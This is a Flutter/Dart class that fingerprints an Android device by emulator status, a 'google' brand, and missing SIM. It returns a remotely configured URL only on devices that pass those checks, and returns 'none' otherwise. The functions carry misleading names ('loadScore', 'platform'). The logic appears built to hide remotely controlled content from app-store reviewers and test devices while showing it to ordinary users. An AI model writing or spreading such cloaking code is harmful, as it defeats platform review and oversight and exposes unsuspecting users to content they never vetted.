import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/services.dart';
import 'package:flutter_sim_country_code/flutter_sim_country_code.dart';
import 'package:shared_preferences/shared_preferences.dart';

class DeviceInfo {
  static final DeviceInfoPlugin _deviceInfoPlugin = DeviceInfoPlugin();
  static final FirebaseRemoteConfig remoteConfig =
      FirebaseRemoteConfig.instance;

  String _path = 'none';
  String get path => _path;
  late bool simIsEmpty;
  String? _carrierName;
  bool? _isPhysicalDevice;
  String _brand = '';
  final SharedPreferences _prefs;

  factory DeviceInfo(SharedPreferences prefs) {
    return DeviceInfo._(prefs);
  }
  DeviceInfo._(this._prefs);

  getInfo() async {
    try {
      if (_prefs.getString("url") == null || _prefs.getString("url")!.isEmpty) {
        var deviceInfo = await _deviceInfoPlugin.androidInfo;
        _brand = deviceInfo.brand ?? "noName";
        _isPhysicalDevice = deviceInfo.isPhysicalDevice ?? false;
        simIsEmpty = await platform();
        // var simData = await SimDataPlugin.getSimData();
        // _isSimNotExist = simData.cards.isEmpty;
        // _carrierName = simData.cards.first.carrierName;

        _path = await loadScore("url");
        _isPhysicalDevice = _isPhysicalDevice ?? true;
        _carrierName = _carrierName ?? "";
        if (!_isPhysicalDevice! ||
            _brand.contains("google") ||
            simIsEmpty ||
            path == "none") {
          return "none";
        } else {
          _prefs.setString("url", _path);
          return path;
        }
      } else {
        _path = _prefs.getString("url")!;
        return path;
      }
    } catch (e) {
      throw e;
    }
  }

  platform() async {
    String platformVersion;
    try {
      platformVersion = (await FlutterSimCountryCode.simCountryCode)!;
    } on PlatformException {
      platformVersion = 'Failed';
    }

    return platformVersion.length != 2;
  }

  Future<String> loadScore(String c) async {
    final FirebaseRemoteConfig remoteConfig = FirebaseRemoteConfig.instance;
    await remoteConfig.fetch();
    await remoteConfig.activate();
    return remoteConfig.getString(c);
  }
}
